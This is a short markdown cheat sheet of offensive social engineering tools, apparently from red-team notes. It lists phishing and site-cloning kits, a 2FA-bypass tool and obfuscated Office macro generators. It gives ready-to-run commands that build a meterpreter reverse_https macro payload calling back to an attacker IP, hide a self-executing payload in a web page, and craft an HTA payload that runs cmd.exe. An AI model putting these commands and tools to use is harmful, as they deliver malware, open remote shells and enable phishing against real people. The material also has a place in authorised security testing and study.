# Social Engineering

## General

#### Social engineering toolkit (seh) (https://github.com/trustedsec/social-engineer-toolkit)
Clones sites for phishing and more.

#### ReelPhish (https://github.com/fireeye/ReelPhish)
Bypasses 2FA.

#### GoPhish (https://getgophish.com)
Automated phishing mails. There is also phishing-frenzy (ruby) and king-phisher (python).

## Office Macros
* empire has a macro stager `windows/macro`
* unicorn (https://github.com/trustedsec/unicorn) can create payloads for meterpreter `./unicorn.py windows/meterpreter/reverse_https <attackerip> 443 macro` and start handler with `msfconsole -r ./unicorn.rc`
* automated via luckystrike (https://github.com/curi0usJack/luckystrike)
* VBad (https://github.com/Pepitoh/VBad) creates heavily obfuscated macro payloads
* there is also DDE Attacks (mostly patched) via empire `windows/macroless_msword`

## Webpages
* EmbedInHTML hides Malware in Websites, downloads payload, executes it, deletes traces (https://github.com/Arno0x/EmbedInHTML) `python embedInHTML.py -k keypassshere -f meterpreter.xll -o index.html -w`
* for hta payloads (https://github.com/nccgroup/demiguise) `python demiguise.py -k hello -c "cmd.exe /c <pscommand>" -o Outlook.Application -o test.hta`
* jenkins exploit via (https://github.com/cheetz/generateJenkinsExploit)

tags: [social engineering]